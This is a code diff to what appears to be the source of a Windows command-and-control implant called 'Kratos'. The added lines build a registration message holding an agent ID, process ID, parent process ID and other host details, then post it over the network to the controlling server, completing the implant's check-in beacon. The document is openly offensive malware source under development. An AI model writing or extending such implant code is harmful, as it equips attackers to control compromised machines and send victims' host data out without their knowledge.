@@ -1,6 +1,7 @@
 #include "agent/core.h"
 #include "packager/packager.h"
 #include "utils/utils.h"
+#include "net/net.h"
 
 
 INT32 GenerateAgentID( ) {
@@ -116,6 +117,7 @@ PWSTR GetCountry( ) {
 BOOL Kratos::Register() {
 
 	if ( ! packager->NewPacker( ) ) { return FALSE; }
+	if ( ! packager->PrepareMetaData( 0 ) ) { return FALSE; }
 
 	INT32 AgentID    = GenerateAgentID( );
 	INT32 Pid        = TO_DWORD( utils::win::GetTeb( )->ClientId.UniqueProcess );
@@ -129,6 +131,7 @@ BOOL Kratos::Register() {
 
 	printf("Packager: %0xp\n", packager);
 
+	packager->Pack4( MSG_REGISTER );
 	packager->Pack4( AgentID    );
 	packager->Pack4( Pid        );
 	packager->Pack4( PPId       );
@@ -142,7 +145,8 @@ BOOL Kratos::Register() {
 	DEBUG_LOG("[+] Packed strings");
 
 
-
+	net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize( ) );
+	this->AgentID = AgentID;
 
 
 
